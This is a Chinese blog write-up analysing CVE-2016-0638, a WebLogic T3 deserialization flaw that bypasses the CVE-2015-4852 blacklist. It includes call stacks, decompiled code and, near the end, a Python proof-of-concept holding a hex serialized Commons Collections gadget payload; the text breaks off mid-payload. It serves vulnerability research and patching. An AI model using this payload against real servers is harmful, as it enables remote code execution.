<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Weblogic T3反序列化之二： CVE-2016-06380x01 漏洞描述这个漏洞其实是对CVE-2015-4852补丁的绕过。 关于T3反序列化，有多个CVE：  CVE-2015-4852   CVE-2016-0638   CVE-2016-3510    CVE-2017-3248    CVE-2018-2628  CVE-2018-2893  0x02 漏洞分析既然是对CVE-">
<meta property="og:type" content="article">
<meta property="og:title" content="weblogic&#x2F;Weblogic T3反序列化之二： CVE-2016-0638">
<meta property="og:url" content="http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/index.html">
<meta property="og:site_name" content="Homer&#39;s blog">
<meta property="og:description" content="Weblogic T3反序列化之二： CVE-2016-06380x01 漏洞描述这个漏洞其实是对CVE-2015-4852补丁的绕过。 关于T3反序列化，有多个CVE：  CVE-2015-4852   CVE-2016-0638   CVE-2016-3510    CVE-2017-3248    CVE-2018-2628  CVE-2018-2893  0x02 漏洞分析既然是对CVE-">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-04-10T15:28:24.550Z">
<meta property="article:modified_time" content="2020-04-10T15:28:24.551Z">
<meta property="article:author" content="Homer">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>weblogic/Weblogic T3反序列化之二： CVE-2016-0638</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/posts/">Writing</a></li>
         
          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/04/10/weblogic/CVE-2020-2555%E5%88%86%E6%9E%90/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&text=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&is_video=false&description=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=weblogic/Weblogic T3反序列化之二： CVE-2016-0638&body=Check out this article: http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&title=weblogic/Weblogic T3反序列化之二： CVE-2016-0638" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/weblogic/Weblogic%20T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E4%BA%8C%EF%BC%9A%20CVE-2016-0638/&name=weblogic/Weblogic T3反序列化之二： CVE-2016-0638&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic-T3反序列化之二：-CVE-2016-0638"><span class="toc-number">1.</span> <span class="toc-text">Weblogic T3反序列化之二： CVE-2016-0638</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞描述"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞PoC"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 漏洞PoC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-补丁"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 参考</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        weblogic/Weblogic T3反序列化之二： CVE-2016-0638
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Homer's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-04-10T15:28:24.550Z" itemprop="datePublished">2020-04-10</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Weblogic-T3反序列化之二：-CVE-2016-0638"><a href="#Weblogic-T3反序列化之二：-CVE-2016-0638" class="headerlink" title="Weblogic T3反序列化之二： CVE-2016-0638"></a>Weblogic T3反序列化之二： CVE-2016-0638</h1><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>这个漏洞其实是对CVE-2015-4852补丁的绕过。</p>
<p>关于T3反序列化，有多个CVE：</p>
<ul>
<li>CVE-2015-4852  </li>
<li>CVE-2016-0638  </li>
<li>CVE-2016-3510   </li>
<li>CVE-2017-3248   </li>
<li>CVE-2018-2628 </li>
<li>CVE-2018-2893</li>
</ul>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>既然是对CVE-2015-4852的补丁绕过，那一定跟4852的调用栈很像了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">readExternal:<span class="number">1417</span>, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">readExternalData:<span class="number">1814</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1773</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">349</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>​                                                                    <em>信息 1 CVE-2016-0638调用栈</em></p>
<p>对比一下CVE-2015-4852的调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">328</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">39</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">25</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">597</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">969</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1871</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1775</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">349</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">387</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">967</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">899</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>​                                                    <em>信息 2 CVE-2015-4852调用栈</em></p>
<p>区别是在<code>readOrdinaryObject</code>走向了不同的分支：</p>
<p><code>/weblogic/10.3.6/jdk/jdk1.6.0_45/src.zip!/java/io/ObjectInputStream.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">    readExternalData((Externalizable) obj, desc);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    readSerialData(obj, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​                                                                <em>信息 3</em></p>
<p>但在此之前，都经历了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readObject0:<span class="number">1327</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">349</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">66</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">38</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">213</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br></pre></td></tr></table></figure>

<p>​                                                                    <em>信息 4</em></p>
<p>这里的<code>ObjectInputStream::readObject</code>对应的代码：</p>
<p><code>weblogic/rjvm/InboundMsgAbbrev.class</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    int var2 &#x3D; var1.read();</span><br><span class="line">    switch(var2) &#123;</span><br><span class="line">    case 0:</span><br><span class="line">        return (new InboundMsgAbbrev.ServerChannelInputStream(var1)).readObject(); ---5.1</span><br><span class="line">    case 1:</span><br><span class="line">        return var1.readASCII();</span><br><span class="line">    default:</span><br><span class="line">        throw new StreamCorruptedException(&quot;Unknown typecode: &#39;&quot; + var2 + &quot;&#39;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​                                                                                    <em>信息 5</em></p>
<p>5.1处的代码是不是很熟悉，这正是CVE-2015-4852加补丁代码的地方，那么新的CVE-2016-0638也走了同样的路，为什么没有被拦截呢？是如何绕过的呢？继续看。</p>
<p>上述<code>信息 4</code>调用中，有对应以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(MsgAbbrevInputStream var1, BubblingAbbrever var2)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var3 = var1.readLength();  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123; --- <span class="number">6.1</span></span><br><span class="line">        <span class="keyword">int</span> var5 = var1.readLength();</span><br><span class="line">        Object var6;</span><br><span class="line">        <span class="keyword">if</span> (var5 &gt; var2.getCapacity()) &#123;</span><br><span class="line">            var6 = <span class="keyword">this</span>.readObject(var1); ---<span class="number">6.2</span></span><br><span class="line">            var2.getAbbrev(var6);</span><br><span class="line">            <span class="keyword">this</span>.abbrevs.push(var6);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            var6 = var2.getValue(var5);</span><br><span class="line">            <span class="keyword">this</span>.abbrevs.push(var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readObject</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var2 = var1.read();</span><br><span class="line">    <span class="keyword">switch</span>(var2) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> InboundMsgAbbrev.ServerChannelInputStream(var1)).readObject(); ---<span class="number">6.3</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> var1.readASCII();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"Unknown typecode: '"</span> + var2 + <span class="string">"'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​                                                                            <em>信息 6</em></p>
<p>6.1处其实是循环处理inputStream即var1中的全部序列化后的object(ac ed 00开头的)，所以理论上PoC中每个序列化后的object都会进6.3进行反序列化，所以CVE-2015-4852就在6.3对应的<code>ServerChannelInputStream</code>添加了黑名单类、包名扫描。</p>
<p>后来有人发现了一个监控盲点，即<code>StreamMessageImpl::readExternal</code>，这个函数很有意思，它会自己用额外的<code>ObjectInputStream</code>来处理一个序列化后的对象，对应6.1，就是“偷走了“一个object放到了<code>StreamMessageImpl::readExternal</code>里面处理，而<code>StreamMessageImpl::readExternal</code>里面是没有黑名单过滤的。</p>
<p>先看看<code>StreamMessageImpl::readExternal</code>：</p>
<p><code>weblogic/jms/common/StreamMessageImpl.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.readExternal(var1);</span><br><span class="line">    <span class="keyword">byte</span> var2 = var1.readByte();</span><br><span class="line">    <span class="keyword">byte</span> var3 = (<span class="keyword">byte</span>)(var2 &amp; <span class="number">127</span>);</span><br><span class="line">    <span class="keyword">if</span> (var3 &gt;= <span class="number">1</span> &amp;&amp; var3 &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">            BufferInputStream var4 = <span class="keyword">this</span>.payload.getInputStream();</span><br><span class="line">            ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4); ---<span class="number">7.1</span></span><br><span class="line">            <span class="keyword">this</span>.setBodyWritable(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">this</span>.setPropertiesWritable(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.writeObject(var5.readObject()); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</span><br></pre></td></tr></table></figure>

<p>​                                                                                    <em>信息 7</em></p>
<p>7.1处有新的<code>ObjectInputStream</code>，会从6.1处偷走一个序列化后的object，而这个object正是原黑名单中的：</p>
<p>![image-20200202135130383](/Users/panicall/Library/Application Support/typora-user-images/image-20200202135130383.png)</p>
<p>​                                                                                    <em>信息 8</em></p>
<p>很显然这个Object原本应该在6.3处被反序列化的，但现在<code>StreamMessageImpl::readExternal</code>中反序列化了，自然不会被黑名单扫描了。</p>
<h2 id="0x03-漏洞PoC"><a href="#0x03-漏洞PoC" class="headerlink" title="0x03 漏洞PoC"></a>0x03 漏洞PoC</h2><p>见<code>参考 1</code></p>
<p>这里贴出来供参考：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> ____       _     _     _ _   __  __           _    </span></span><br><span class="line"><span class="string">|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __</span></span><br><span class="line"><span class="string">| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /</span></span><br><span class="line"><span class="string">|  _ &lt; (_| | |_) | |_) | | |_| |  | | (_| \__ \   &lt; </span></span><br><span class="line"><span class="string">|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=<span class="string">'Weblogic.log'</span>,</span><br><span class="line">                    format=<span class="string">'%(asctime)s %(message)s'</span>,</span><br><span class="line">                    filemode=<span class="string">"w"</span>, level=logging.INFO)</span><br><span class="line"></span><br><span class="line">VUL=[<span class="string">'CVE-2016-0638'</span>]</span><br><span class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e